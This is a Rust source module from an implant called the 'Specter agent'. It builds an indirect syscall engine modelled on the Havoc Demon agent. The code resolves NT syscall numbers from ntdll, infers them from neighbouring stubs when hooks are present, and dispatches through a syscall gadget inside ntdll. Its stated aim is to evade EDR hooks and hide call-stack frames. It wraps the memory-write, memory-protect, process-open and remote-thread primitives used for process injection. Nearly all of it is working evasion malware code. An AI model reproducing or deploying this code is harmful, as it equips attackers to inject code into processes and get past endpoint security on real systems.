//! Indirect syscall engine for the Specter agent.
//!
//! Resolves NT System Service Numbers (SSNs) from the `ntdll.dll` export table
//! at runtime, then invokes NT functions via an indirect `syscall` gadget address
//! found inside ntdll itself.  This bypasses user-mode EDR hooks placed at NT
//! stub entry points.
//!
//! ## Technique
//!
//! 1. Locate `ntdll.dll` in the process address space via `GetModuleHandleA`.
//! 2. Walk the PE export directory to find each `Nt*` function by name.
//! 3. Scan the function bytes for the x64 NT stub pattern:
//!    `4C 8B D1` (`mov r10, rcx`) + `B8 xx xx 00 00` (`mov eax, <ssn>`).
//! 4. If the function is hooked (bytes don't match), walk neighbouring stubs to
//!    infer the SSN by counting distance from an unhooked neighbour.
//! 5. Find the `0F 05` (`syscall`) instruction within an unhooked stub to obtain
//!    the indirect dispatch address.
//! 6. At call time:
//!    - [`sys_set_config`] stores a pointer to the [`SyscallEntry`] in `r11`.
//!    - [`sys_invoke`] loads `SSN → EAX`, then `jmp [r11]` to the indirect
//!      `syscall` address inside ntdll.  The ntdll `ret` that follows the
//!      `syscall` instruction returns directly to `sys_invoke`'s caller,
//!      leaving no intermediate frame on the call stack visible to EDR.
//!
//! ## Thread safety
//!
//! `SYSCALL_TABLE` is a [`std::sync::OnceLock`] — write-once, then read-only.
//! The `sys_set_config` / `sys_invoke` pair uses the caller-saved `r11` register
//! as a per-call communication channel; the two assembly calls must not be
//! interleaved across threads for the same logical invocation.  The per-function
//! wrapper functions in this module satisfy that requirement.
//!
//! On non-Windows builds all public functions return stub values so Linux CI
//! can compile and test the codebase without a Windows target.

#[cfg(all(windows, target_arch = "x86_64"))]
use std::sync::OnceLock;
use thiserror::Error;

// ── Error type ────────────────────────────────────────────────────────────────

/// Errors that can occur during syscall table initialisation or invocation.
#[derive(Debug, Error)]
pub enum SyscallError {
    /// `ntdll.dll` could not be located in the process address space.
    #[error("ntdll.dll not found in process address space")]
    NtdllNotFound,

    /// A required NT function was not found in the ntdll export table.
    #[error("NT function not found in ntdll: {0}")]
    FunctionNotFound(&'static str),

    /// The syscall table has not been initialised yet.
    #[error("syscall table not initialised — call init() first")]
    NotInitialised,
}

// ── Types ─────────────────────────────────────────────────────────────────────

/// Holds the indirect syscall instruction address and SSN for one NT function.
///
/// The layout mirrors Demon's `SYS_CONFIG` struct exactly:
///
/// | Offset | Size | Field           |
/// |--------|------|-----------------|
/// | 0      | 8    | `indirect_addr` |
/// | 8      | 4    | `ssn`           |
/// | 12     | 4    | `_pad`          |
///
/// The assembly stub `sys_invoke` loads `[r11]` (8-byte pointer to the
/// `syscall` instruction) and `[r11 + 8]` (4-byte SSN into EAX).
#[repr(C)]
#[derive(Debug, Default, Clone)]
pub struct SyscallEntry {
    /// Address of a `syscall` (0x0F 0x05) instruction within ntdll.
    pub indirect_addr: u64,
    /// System Service Number — loaded into EAX before the syscall instruction.
    pub ssn: u32,
    _pad: u32,
}

impl SyscallEntry {
    /// Returns `true` if both the indirect address and SSN have been resolved.
    #[must_use]
    pub fn is_resolved(&self) -> bool {
        self.indirect_addr != 0
    }
}

/// Table of resolved [`SyscallEntry`] values for all NT functions used by Specter.
#[derive(Debug, Default)]
pub struct SyscallTable {
    pub nt_allocate_virtual_memory: SyscallEntry,
    pub nt_write_virtual_memory: SyscallEntry,
    pub nt_read_virtual_memory: SyscallEntry,
    pub nt_free_virtual_memory: SyscallEntry,
    pub nt_protect_virtual_memory: SyscallEntry,
    pub nt_create_thread_ex: SyscallEntry,
    pub nt_open_process: SyscallEntry,
    pub nt_open_thread: SyscallEntry,
    pub nt_terminate_process: SyscallEntry,
    pub nt_terminate_thread: SyscallEntry,
    pub nt_queue_apc_thread: SyscallEntry,
    pub nt_suspend_thread: SyscallEntry,
    pub nt_resume_thread: SyscallEntry,
    pub nt_wait_for_single_object: SyscallEntry,
    pub nt_query_information_process: SyscallEntry,
    pub nt_close: SyscallEntry,
}

// ── Global singleton (Windows x86-64 only) ────────────────────────────────────

#[cfg(all(windows, target_arch = "x86_64"))]
static SYSCALL_TABLE: OnceLock<SyscallTable> = OnceLock::new();

/// Return the global [`SyscallTable`], or `None` if [`init`] has not been called.
///
/// Always returns `None` on non-Windows targets.
#[must_use]
pub fn table() -> Option<&'static SyscallTable> {
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        SYSCALL_TABLE.get()
    }
    #[cfg(not(all(windows, target_arch = "x86_64")))]
    {
        None
    }
}

/// Initialise the global syscall table by scanning ntdll.
///
/// Idempotent — safe to call multiple times; only the first call does work.
/// On non-Windows targets this is a no-op that always returns `Ok(())`.
///
/// # Errors
///
/// Returns [`SyscallError`] if ntdll cannot be found or a required function
/// could not be resolved.
pub fn init() -> Result<(), SyscallError> {
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        // Fast path: already initialised.
        if SYSCALL_TABLE.get().is_some() {
            return Ok(());
        }
        // Resolve once and attempt to set.  A concurrent init race is benign:
        // OnceLock::set returns Err if another thread beat us, which we ignore.
        let table = SyscallTable::resolve()?;
        let _ = SYSCALL_TABLE.set(table);
        Ok(())
    }
    #[cfg(not(all(windows, target_arch = "x86_64")))]
    {
        Ok(())
    }
}

// ── x86-64 Windows assembly stubs ─────────────────────────────────────────────
//
// Two naked assembly functions that mirror Demon's `Syscall.x64.asm`:
//
//   sys_set_config(config: *const SyscallEntry)
//     → mov r11, rcx ; ret
//     Stores the config pointer in the non-volatile scratch register r11.
//
//   sys_invoke(arg1, arg2, arg3, arg4, [stack args…]) -> i32
//     → mov r10, rcx ; mov eax, [r11+8] ; jmp [r11]
//     Applies the Windows NT syscall calling convention (arg1 in R10),
//     loads the SSN into EAX, and jumps to the indirect syscall address.
//     The `syscall` instruction in ntdll is immediately followed by `ret`,
//     which returns to sys_invoke's caller — no extra frame.
//
// NOTE: `sys_set_config` must be called immediately before `sys_invoke` with
// no intervening code that modifies r11 (a volatile/caller-saved register in
// the Windows x64 ABI).  The per-function wrappers below satisfy this.

#[cfg(all(windows, target_arch = "x86_64"))]
std::arch::global_asm!(
    // Switch to Intel syntax for readability; restore AT&T at the end.
    ".intel_syntax noprefix",
    ".globl sys_set_config",
    "sys_set_config:",
    "  mov r11, rcx",
    "  ret",
    "",
    // sys_invoke: indirect NT syscall dispatcher.
    // On entry, the Windows x64 call frame has already been set up by the Rust
    // caller with all NT arguments in the correct positions (RCX/RDX/R8/R9 and
    // stack).  We only need to:
    //   1. mov r10, rcx  — NT calling convention shifts arg1 from RCX to R10.
    //   2. mov eax, [r11+8] — load SSN (DWORD at offset 8 in SyscallEntry).
    //   3. jmp [r11]     — jump to the indirect syscall instruction in ntdll.
    // ntdll's own `ret` after the syscall instruction returns to our caller.
    ".globl sys_invoke",
    "sys_invoke:",
    "  mov r10, rcx",
    "  mov eax, DWORD PTR [r11 + 8]",
    "  jmp QWORD PTR [r11]",
    ".att_syntax prefix",
);

// ── extern declarations (Windows x64 only) ────────────────────────────────────

#[cfg(all(windows, target_arch = "x86_64"))]
unsafe extern "C" {
    /// Store `config` in `r11` for the immediately following [`sys_invoke`] call.
    fn sys_set_config(config: *const SyscallEntry);
}

// ── Windows implementation ────────────────────────────────────────────────────

#[cfg(all(windows, target_arch = "x86_64"))]
#[allow(unsafe_code)]
mod imp {
    use std::ffi::c_void;

    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;

    use super::{SyscallEntry, SyscallError, SyscallTable, sys_set_config};

    // ── PE constants ──────────────────────────────────────────────────────────

    /// Byte offset from the NT headers base to the export directory RVA.
    ///
    /// `NT_HEADERS + 4 (Signature) + 20 (COFF FileHeader) + 112 (Optional PE32+
    /// header fields before DataDirectory[0].VirtualAddress) = 136 = 0x88`.
    const EXPORT_DIR_RVA_OFFSET: usize = 0x88;

    /// x64 NT stub prologue: `mov r10, rcx` (3 bytes) + `mov eax, <ssn>` (1 byte).
    const STUB_PREFIX: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8];

    /// `ret` — used as the end-of-function sentinel while scanning.
    const ASM_RET: u8 = 0xC3;

    /// `syscall` instruction — little-endian u16.
    const ASM_SYSCALL: u16 = 0x050F;

    /// Maximum forward scan range when looking for `syscall` or SSN.
    const SCAN_RANGE: usize = 0x1E;

    /// Maximum number of neighbouring stubs to walk when inferring a hooked SSN.
    const NEIGHBOUR_LIMIT: u32 = 500;

    // ── ntdll base resolution ─────────────────────────────────────────────────

    /// Return the base address of `ntdll.dll` in the current process, or
    /// `Err(SyscallError::NtdllNotFound)`.
    pub fn ntdll_base() -> Result<*const u8, SyscallError> {
        // SAFETY: "ntdll.dll\0" is a valid null-terminated ASCII string.
        let handle = unsafe { GetModuleHandleA(b"ntdll.dll\0".as_ptr()) };
        if handle == 0 { Err(SyscallError::NtdllNotFound) } else { Ok(handle as *const u8) }
    }

    // ── PE export table walk ──────────────────────────────────────────────────

    /// Call `callback` for every named export in the module at `base`, passing
    /// the name and the function RVA.
    ///
    /// # Safety
    ///
    /// `base` must point to a valid, mapped PE image.
    unsafe fn for_each_export(base: *const u8, mut callback: impl FnMut(&[u8], u32)) {
        // SAFETY: DOS e_lfanew is always at offset 0x3C.
        let e_lfanew = unsafe { std::ptr::read_unaligned(base.add(0x3C) as *const i32) };
        let nt_base = unsafe { base.add(e_lfanew as usize) };

        let export_rva =
            unsafe { std::ptr::read_unaligned(nt_base.add(EXPORT_DIR_RVA_OFFSET) as *const u32) };
        if export_rva == 0 {
            return;
        }

        // SAFETY: RVA is relative to module base; offset into valid mapped memory.
        let exp_dir = unsafe { base.add(export_rva as usize) };

        // IMAGE_EXPORT_DIRECTORY field offsets (all u32):
        //   0  Characteristics
        //   4  TimeDateStamp
        //   8  MajorVersion (u16)
        //  10  MinorVersion (u16)
        //  12  Name
        //  16  Base
        //  20  NumberOfFunctions
        //  24  NumberOfNames
        //  28  AddressOfFunctions
        //  32  AddressOfNames
        //  36  AddressOfNameOrdinals (u16 array)
        let n_names = unsafe { std::ptr::read_unaligned(exp_dir.add(24) as *const u32) } as usize;
        let addr_of_funcs =
            unsafe { std::ptr::read_unaligned(exp_dir.add(28) as *const u32) } as usize;
        let addr_of_names =
            unsafe { std::ptr::read_unaligned(exp_dir.add(32) as *const u32) } as usize;
        let addr_of_ords =
            unsafe { std::ptr::read_unaligned(exp_dir.add(36) as *const u32) } as usize;

        let names_table = unsafe { base.add(addr_of_names) as *const u32 };
        let ords_table = unsafe { base.add(addr_of_ords) as *const u16 };
        let funcs_table = unsafe { base.add(addr_of_funcs) as *const u32 };

        for i in 0..n_names {
            let name_rva = unsafe { std::ptr::read_unaligned(names_table.add(i)) } as usize;
            let name_ptr = unsafe { base.add(name_rva) };

            // Build a byte slice up to the NUL terminator (max 128 bytes).
            let mut len = 0usize;
            while len < 128 {
                if unsafe { *name_ptr.add(len) } == 0 {
                    break;
                }
                len += 1;
            }
            let name_bytes = unsafe { std::slice::from_raw_parts(name_ptr, len) };

            let ordinal = unsafe { std::ptr::read_unaligned(ords_table.add(i)) } as usize;
            let func_rva = unsafe { std::ptr::read_unaligned(funcs_table.add(ordinal)) };

            callback(name_bytes, func_rva);
        }
    }

    // ── SSN / syscall-address extraction ─────────────────────────────────────

    /// Try to extract the SSN from the NT stub prologue at `func_ptr`.
    ///
    /// Returns `Some(ssn)` if the unhooked prologue pattern is found.
    pub fn extract_ssn(func_ptr: *const u8) -> Option<u16> {
        // SAFETY: We scan at most SCAN_RANGE bytes; func_ptr is a mapped function.
        unsafe {
            for offset in 0..SCAN_RANGE {
                let p = func_ptr.add(offset);
                if *p == ASM_RET {
                    break;
                }
                if std::slice::from_raw_parts(p, 4) == STUB_PREFIX {
                    // SSN is at +4 (low byte) and +5 (high byte).
                    let lo = *p.add(4) as u16;
                    let hi = *p.add(5) as u16;
                    return Some((hi << 8) | lo);
                }
            }
            None
        }
    }

    /// Try to find the `syscall` (0x0F 0x05) instruction within the stub at
    /// `func_ptr`, and return its address for use as the indirect dispatch address.
    pub fn find_syscall_instruction(func_ptr: *const u8) -> Option<u64> {
        // SAFETY: Scanning a bounded range within a mapped function.
        unsafe {
            for i in 0..SCAN_RANGE {
                let p = func_ptr.add(i);
                if *p == ASM_RET {
                    break;
                }
                let word = std::ptr::read_unaligned(p as *const u16);
                if word == ASM_SYSCALL {
                    return Some(p as u64);
                }
            }
            None
        }
    }

    /// Determine the size of a single NT stub by measuring the distance between
    /// two consecutive named Nt* exports.  Returns 0 on failure.
    pub fn stub_size(base: *const u8) -> usize {
        let mut found: [u64; 2] = [0; 2];
        let mut count = 0usize;

        // SAFETY: for_each_export is safe given a valid module base.
        unsafe {
            for_each_export(base, |name, rva| {
                if count >= 2 {
                    return;
                }
                // Only look at Nt-prefixed exports that look like plain stubs.
                if name.starts_with(b"Nt") && rva != 0 {
                    let fptr = base.add(rva as usize) as *const u8;
                    if extract_ssn(fptr).is_some() {
                        found[count] = fptr as u64;
                        count += 1;
                    }
                }
            });
        }

        if count < 2 || found[1] <= found[0] {
            return 0;
        }
        (found[1] - found[0]) as usize
    }

    /// If `func_ptr` is hooked (SSN cannot be extracted directly), walk
    /// neighbouring stubs above and below to infer the SSN by distance.
    pub fn find_ssn_from_neighbour(func_ptr: *const u8, stub_sz: usize) -> Option<u16> {
        if stub_sz == 0 {
            return None;
        }
        for i in 1u32..NEIGHBOUR_LIMIT {
            let step = stub_sz.checked_mul(i as usize)?;

            // Try stub above.
            let above = unsafe { func_ptr.add(step) };
            if let Some(ssn) = extract_ssn(above) {
                return ssn.checked_sub(i as u16);
            }

            // Try stub below.
            if (func_ptr as usize) > step {
                let below = unsafe { func_ptr.sub(step) };
                if let Some(ssn) = extract_ssn(below) {
                    return ssn.checked_add(i as u16);
                }
            }
        }
        None
    }

    // ── SyscallTable resolution ───────────────────────────────────────────────

    impl SyscallTable {
        /// Scan ntdll and resolve all entries in the table.
        pub fn resolve() -> Result<Self, SyscallError> {
            let base = ntdll_base()?;
            let sz = stub_size(base);

            // One-pass export walk: populate a small flat map of name → rva.
            let mut exports: std::collections::HashMap<&'static [u8], u32> =
                std::collections::HashMap::new();

            const NAMES: &[(&[u8], &str)] = &[
                (b"NtAllocateVirtualMemory", "NtAllocateVirtualMemory"),
                (b"NtWriteVirtualMemory", "NtWriteVirtualMemory"),
                (b"NtReadVirtualMemory", "NtReadVirtualMemory"),
                (b"NtFreeVirtualMemory", "NtFreeVirtualMemory"),
                (b"NtProtectVirtualMemory", "NtProtectVirtualMemory"),
                (b"NtCreateThreadEx", "NtCreateThreadEx"),
                (b"NtOpenProcess", "NtOpenProcess"),
                (b"NtOpenThread", "NtOpenThread"),
                (b"NtTerminateProcess", "NtTerminateProcess"),
                (b"NtTerminateThread", "NtTerminateThread"),
                (b"NtQueueApcThread", "NtQueueApcThread"),
                (b"NtSuspendThread", "NtSuspendThread"),
                (b"NtResumeThread", "NtResumeThread"),
                (b"NtWaitForSingleObject", "NtWaitForSingleObject"),
                (b"NtQueryInformationProcess", "NtQueryInformationProcess"),
                (b"NtClose", "NtClose"),
            ];

            // SAFETY: base is a valid mapped module.
            unsafe {
                for_each_export(base, |name, rva| {
                    for (needle, _) in NAMES {
                        if name == *needle {
                            exports.insert(needle, rva);
                            break;
                        }
                    }
                });
            }

            // Also resolve the indirect syscall address from NtAddBootEntry
            // (an "unused" NT function — Demon uses it as a reference stub).
            let indirect_addr = unsafe { for_each_export_find_indirect(base) };

            let mut table = SyscallTable::default();

            macro_rules! resolve {
                ($field:ident, $name:literal) => {{
                    if let Some(&rva) = exports.get($name as &[u8]) {
                        let fptr = unsafe { base.add(rva as usize) as *const u8 };
                        let ssn = extract_ssn(fptr)
                            .or_else(|| find_ssn_from_neighbour(fptr, sz))
                            .unwrap_or(0);
                        table.$field = SyscallEntry {
                            indirect_addr: indirect_addr.unwrap_or(0),
                            ssn: ssn as u32,
                            _pad: 0,
                        };
                    }
                }};
            }

            resolve!(nt_allocate_virtual_memory, b"NtAllocateVirtualMemory");
            resolve!(nt_write_virtual_memory, b"NtWriteVirtualMemory");
            resolve!(nt_read_virtual_memory, b"NtReadVirtualMemory");
            resolve!(nt_free_virtual_memory, b"NtFreeVirtualMemory");
            resolve!(nt_protect_virtual_memory, b"NtProtectVirtualMemory");
            resolve!(nt_create_thread_ex, b"NtCreateThreadEx");
            resolve!(nt_open_process, b"NtOpenProcess");
            resolve!(nt_open_thread, b"NtOpenThread");
            resolve!(nt_terminate_process, b"NtTerminateProcess");
            resolve!(nt_terminate_thread, b"NtTerminateThread");
            resolve!(nt_queue_apc_thread, b"NtQueueApcThread");
            resolve!(nt_suspend_thread, b"NtSuspendThread");
            resolve!(nt_resume_thread, b"NtResumeThread");
            resolve!(nt_wait_for_single_object, b"NtWaitForSingleObject");
            resolve!(nt_query_information_process, b"NtQueryInformationProcess");
            resolve!(nt_close, b"NtClose");

            tracing::debug!(
                ntdll_base = ?base,
                stub_size = sz,
                indirect_addr = ?indirect_addr,
                "syscall table resolved"
            );

            Ok(table)
        }
    }

    /// Find the indirect syscall address by locating NtAddBootEntry (a safe
    /// reference stub that is never hooked in production) and scanning for the
    /// `syscall` instruction within it.
    unsafe fn for_each_export_find_indirect(base: *const u8) -> Option<u64> {
        let mut indirect: Option<u64> = None;
        unsafe {
            for_each_export(base, |name, rva| {
                if indirect.is_some() {
                    return;
                }
                if name == b"NtAddBootEntry" {
                    let fptr = base.add(rva as usize) as *const u8;
                    indirect = find_syscall_instruction(fptr);
                }
            });
            // Fallback: find from any resolved NT function
            if indirect.is_none() {
                for_each_export(base, |name, rva| {
                    if indirect.is_some() {
                        return;
                    }
                    if name.starts_with(b"Nt") && rva != 0 {
                        let fptr = base.add(rva as usize) as *const u8;
                        if let Some(addr) = find_syscall_instruction(fptr) {
                            indirect = Some(addr);
                        }
                    }
                });
            }
        }
        indirect
    }

    // ── NT function wrappers ──────────────────────────────────────────────────
    //
    // Each wrapper:
    //  1. Fetches the SyscallEntry from the global table.
    //  2. Calls sys_set_config to store the entry pointer in r11.
    //  3. Immediately calls sys_invoke (the assembly stub that reads r11) with
    //     the function's arguments.  The two calls are placed back-to-back so
    //     the compiler cannot insert r11-modifying code between them.

    /// `NTSTATUS` value indicating the function is not available (table not init).
    const STATUS_NOT_SUPPORTED: i32 = 0xC00000BBu32 as i32;

    #[inline]
    fn get_entry(entry: &SyscallEntry) -> Option<&SyscallEntry> {
        if entry.is_resolved() { Some(entry) } else { None }
    }

    // We declare sys_invoke with the appropriate arity for each syscall.
    // All declarations resolve to the same `sys_invoke` assembly symbol; the
    // Windows x64 ABI places extra args on the stack at the correct offsets.
    unsafe extern "C" {
        #[link_name = "sys_invoke"]
        fn sys_invoke_4(a: usize, b: usize, c: usize, d: usize) -> i32;

        #[link_name = "sys_invoke"]
        fn sys_invoke_5(a: usize, b: usize, c: usize, d: usize, e: usize) -> i32;

        #[link_name = "sys_invoke"]
        fn sys_invoke_6(a: usize, b: usize, c: usize, d: usize, e: usize, f: usize) -> i32;

        #[link_name = "sys_invoke"]
        fn sys_invoke_7(
            a: usize,
            b: usize,
            c: usize,
            d: usize,
            e: usize,
            f: usize,
            g: usize,
        ) -> i32;

        #[link_name = "sys_invoke"]
        fn sys_invoke_11(
            a: usize,
            b: usize,
            c: usize,
            d: usize,
            e: usize,
            f: usize,
            g: usize,
            h: usize,
            ii: usize,
            j: usize,
            k: usize,
        ) -> i32;
    }

    /// `NtAllocateVirtualMemory` via indirect syscall.
    ///
    /// Allocates a region of virtual memory in the address space of the
    /// specified process.
    ///
    /// | Arg | NT param              |
    /// |-----|-----------------------|
    /// | 1   | ProcessHandle         |
    /// | 2   | *BaseAddress          |
    /// | 3   | ZeroBits              |
    /// | 4   | *RegionSize           |
    /// | 5   | AllocationType        |
    /// | 6   | Protect               |
    pub fn nt_allocate_virtual_memory(
        process: isize,
        base_address: *mut *mut c_void,
        zero_bits: usize,
        region_size: *mut usize,
        alloc_type: u32,
        protect: u32,
    ) -> i32 {
        let tbl = match super::table() {
            Some(t) => t,
            None => return STATUS_NOT_SUPPORTED,
        };
        let entry = match get_entry(&tbl.nt_allocate_virtual_memory) {
            Some(e) => e,
            None => return STATUS_NOT_SUPPORTED,
        };
        unsafe {
            sys_set_config(entry as *const SyscallEntry);
            sys_invoke_6(
                process as usize,
                base_address as usize,
                zero_bits,
                region_size as usize,
                alloc_type as usize,
                protect as usize,
            )
        }
    }

    /// `NtWriteVirtualMemory` via indirect syscall.
    pub fn nt_write_virtual_memory(
        process: isize,
        base_address: *const c_void,
        buffer: *const c_void,
        bytes_to_write: usize,
        bytes_written: *mut usize,
    ) -> i32 {
        let tbl = match super::table() {
            Some(t) => t,
            None => return STATUS_NOT_SUPPORTED,
        };
        let entry = match get_entry(&tbl.nt_write_virtual_memory) {
            Some(e) => e,
            None => return STATUS_NOT_SUPPORTED,
        };
        unsafe {
            sys_set_config(entry as *const SyscallEntry);
            sys_invoke_5(
                process as usize,
                base_address as usize,
                buffer as usize,
                bytes_to_write,
                bytes_written as usize,
            )
        }
    }

    /// `NtReadVirtualMemory` via indirect syscall.
    pub fn nt_read_virtual_memory(
        process: isize,
        base_address: *const c_void,
        buffer: *mut c_void,
        bytes_to_read: usize,
        bytes_read: *mut usize,
    ) -> i32 {
        let tbl = match super::table() {
            Some(t) => t,
            None => return STATUS_NOT_SUPPORTED,
        };
        let entry = match get_entry(&tbl.nt_read_virtual_memory) {
            Some(e) => e,
            None => return STATUS_NOT_SUPPORTED,
        };
        unsafe {
            sys_set_config(entry as *const SyscallEntry);
            sys_invoke_5(
                process as usize,
                base_address as usize,
                buffer as usize,
                bytes_to_read,
                bytes_read as usize,
            )
        }
    }

    /// `NtFreeVirtualMemory` via indirect syscall.
    pub fn nt_free_virtual_memory(
        process: isize,
        base_address: *mut *mut c_void,
        region_size: *mut usize,
        free_type: u32,
    ) -> i32 {
        let tbl = match super::table() {
            Some(t) => t,
            None => return STATUS_NOT_SUPPORTED,
        };
        let entry = match get_entry(&tbl.nt_free_virtual_memory) {
            Some(e) => e,
            None => return STATUS_NOT_SUPPORTED,
        };
        unsafe {
            sys_set_config(entry as *const SyscallEntry);
            sys_invoke_4(
                process as usize,
                base_address as usize,
                region_size as usize,
                free_type as usize,
            )
        }
    }

    /// `NtProtectVirtualMemory` via indirect syscall.
    pub fn nt_protect_virtual_memory(
        process: isize,
        base_address: *mut *mut c_void,
        region_size: *mut usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32 {
        let tbl = match super::table() {
            Some(t) => t,
            None => return STATUS_NOT_SUPPORTED,
        };
        let entry = match get_entry(&tbl.nt_protect_virtual_memory) {
            Some(e) => e,
            None => return STATUS_NOT_SUPPORTED,
        };
        unsafe {
            sys_set_config(entry as *const SyscallEntry);
            sys_invoke_5(
                process as usize,
                base_address as usize,
                region_size as usize,
                new_protect as usize,
                old_protect as usize,
            )
        }
    }

    /// `NtCreateThreadEx` via indirect syscall.
    #[allow(clippy::too_many_arguments)]
    pub fn nt_create_thread_ex(
        thread_handle: *mut isize,
        desired_access: u32,
        object_attributes: *mut c_void,
        process: isize,
        start_routine: *const c_void,
        argument: *const c_void,
        create_flags: u32,
        zero_bits: usize,
        stack_size: usize,
        maximum_stack_size: usize,
        attribute_list: *mut c_void,
    ) -> i32 {
        let tbl = match super::table() {
            Some(t) => t,
            None => return STATUS_NOT_SUPPORTED,
        };
        let entry = match get_entry(&tbl.nt_create_thread_ex) {
            Some(e) => e,
            None => return STATUS_NOT_SUPPORTED,
        };
        unsafe {
            sys_set_config(entry as *const SyscallEntry);
            sys_invoke_11(
                thread_handle as usize,
                desired_access as usize,
                object_attributes as usize,
                process as usize,
                start_routine as usize,
                argument as usize,
                create_flags as usize,
                zero_bits,
                stack_size,
                maximum_stack_size,
                attribute_list as usize,
            )
        }
    }

    /// `NtOpenProcess` via indirect syscall.
    pub fn nt_open_process(
        process_handle: *mut isize,
        desired_access: u32,
        object_attributes: *mut c_void,
        client_id: *mut c_void,
    ) -> i32 {
        let tbl = match super::table() {
            Some(t) => t,
            None => return STATUS_NOT_SUPPORTED,
        };
        let entry = match get_entry(&tbl.nt_open_process) {
            Some(e) => e,
            None => return STATUS_NOT_SUPPORTED,
        };
        unsafe {
            sys_set_config(entry as *const SyscallEntry);
            sys_invoke_4(
                process_handle as usize,
                desired_access as usize,
                object_attributes as usize,
                client_id as usize,
            )
        }
    }

    /// `NtTerminateProcess` via indirect syscall.
    pub fn nt_terminate_process(process: isize, exit_status: i32) -> i32 {
        let tbl = match super::table() {
            Some(t) => t,
            None => return STATUS_NOT_SUPPORTED,
        };
        let entry = match get_entry(&tbl.nt_terminate_process) {
            Some(e) => e,
            None => return STATUS_NOT_SUPPORTED,
        };
        unsafe {
            sys_set_config(entry as *const SyscallEntry);
            // 4-arg variant: 2 used + 2 shadow (unused but required by ABI).
            sys_invoke_4(process as usize, exit_status as usize, 0, 0)
        }
    }

    /// `NtClose` via indirect syscall.
    pub fn nt_close(handle: isize) -> i32 {
        let tbl = match super::table() {
            Some(t) => t,
            None => return STATUS_NOT_SUPPORTED,
        };
        let entry = match get_entry(&tbl.nt_close) {
            Some(e) => e,
            None => return STATUS_NOT_SUPPORTED,
        };
        unsafe {
            sys_set_config(entry as *const SyscallEntry);
            sys_invoke_4(handle as usize, 0, 0, 0)
        }
    }

    /// `NtWaitForSingleObject` via indirect syscall.
    pub fn nt_wait_for_single_object(handle: isize, alertable: bool, timeout: *mut i64) -> i32 {
        let tbl = match super::table() {
            Some(t) => t,
            None => return STATUS_NOT_SUPPORTED,
        };
        let entry = match get_entry(&tbl.nt_wait_for_single_object) {
            Some(e) => e,
            None => return STATUS_NOT_SUPPORTED,
        };
        unsafe {
            sys_set_config(entry as *const SyscallEntry);
            sys_invoke_4(handle as usize, alertable as usize, timeout as usize, 0)
        }
    }
}

// ── Public API — Windows delegates ───────────────────────────────────────────

/// Returns `true` if `status` represents an NTSTATUS success code (`>= 0`).
#[must_use]
pub fn nt_success(status: i32) -> bool {
    status >= 0
}

/// Initialise the syscall table and expose `NtAllocateVirtualMemory`.
///
/// Returns `STATUS_NOT_SUPPORTED` on non-Windows targets or if the table
/// is not yet initialised.
#[cfg(all(windows, target_arch = "x86_64"))]
pub use imp::{
    nt_allocate_virtual_memory, nt_close, nt_create_thread_ex, nt_free_virtual_memory,
    nt_open_process, nt_protect_virtual_memory, nt_read_virtual_memory, nt_terminate_process,
    nt_wait_for_single_object, nt_write_virtual_memory,
};

// ── Non-Windows stubs ─────────────────────────────────────────────────────────

/// `STATUS_NOT_SUPPORTED` — returned by all stubs on non-Windows builds.
pub const STATUS_NOT_SUPPORTED: i32 = 0xC00000BBu32 as i32;

#[cfg(not(all(windows, target_arch = "x86_64")))]
mod stubs {
    use std::ffi::c_void;

    use super::STATUS_NOT_SUPPORTED;

    pub fn nt_allocate_virtual_memory(
        _process: isize,
        _base: *mut *mut c_void,
        _zero_bits: usize,
        _region_size: *mut usize,
        _alloc_type: u32,
        _protect: u32,
    ) -> i32 {
        STATUS_NOT_SUPPORTED
    }
    pub fn nt_write_virtual_memory(
        _process: isize,
        _base: *const c_void,
        _buf: *const c_void,
        _n: usize,
        _written: *mut usize,
    ) -> i32 {
        STATUS_NOT_SUPPORTED
    }
    pub fn nt_read_virtual_memory(
        _process: isize,
        _base: *const c_void,
        _buf: *mut c_void,
        _n: usize,
        _read: *mut usize,
    ) -> i32 {
        STATUS_NOT_SUPPORTED
    }
    pub fn nt_free_virtual_memory(
        _process: isize,
        _base: *mut *mut c_void,
        _size: *mut usize,
        _free_type: u32,
    ) -> i32 {
        STATUS_NOT_SUPPORTED
    }
    pub fn nt_protect_virtual_memory(
        _process: isize,
        _base: *mut *mut c_void,
        _size: *mut usize,
        _new: u32,
        _old: *mut u32,
    ) -> i32 {
        STATUS_NOT_SUPPORTED
    }
    #[allow(clippy::too_many_arguments)]
    pub fn nt_create_thread_ex(
        _handle: *mut isize,
        _access: u32,
        _attrs: *mut c_void,
        _process: isize,
        _start: *const c_void,
        _arg: *const c_void,
        _flags: u32,
        _zero_bits: usize,
        _stack_size: usize,
        _max_stack: usize,
        _attr_list: *mut c_void,
    ) -> i32 {
        STATUS_NOT_SUPPORTED
    }
    pub fn nt_open_process(
        _handle: *mut isize,
        _access: u32,
        _attrs: *mut c_void,
        _client_id: *mut c_void,
    ) -> i32 {
        STATUS_NOT_SUPPORTED
    }
    pub fn nt_terminate_process(_process: isize, _status: i32) -> i32 {
        STATUS_NOT_SUPPORTED
    }
    pub fn nt_close(_handle: isize) -> i32 {
        STATUS_NOT_SUPPORTED
    }
    pub fn nt_wait_for_single_object(_handle: isize, _alertable: bool, _timeout: *mut i64) -> i32 {
        STATUS_NOT_SUPPORTED
    }
}

#[cfg(not(all(windows, target_arch = "x86_64")))]
pub use stubs::{
    nt_allocate_virtual_memory, nt_close, nt_create_thread_ex, nt_free_virtual_memory,
    nt_open_process, nt_protect_virtual_memory, nt_read_virtual_memory, nt_terminate_process,
    nt_wait_for_single_object, nt_write_virtual_memory,
};

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    #![allow(unsafe_code)]

    use super::*;

    /// `nt_success` must return `true` for `STATUS_SUCCESS` (0).
    #[test]
    fn nt_success_accepts_zero() {
        assert!(nt_success(0));
    }

    /// `nt_success` must return `true` for small positive NTSTATUS codes.
    #[test]
    fn nt_success_accepts_positive() {
        assert!(nt_success(0x0000_0001));
        assert!(nt_success(i32::MAX));
    }

    /// `nt_success` must return `false` for all error/warning codes (bit 31 set).
    #[test]
    fn nt_success_rejects_negative() {
        assert!(!nt_success(-1));
        assert!(!nt_success(0xC000_0000u32 as i32)); // STATUS_UNSUCCESSFUL
        assert!(!nt_success(STATUS_NOT_SUPPORTED));
    }

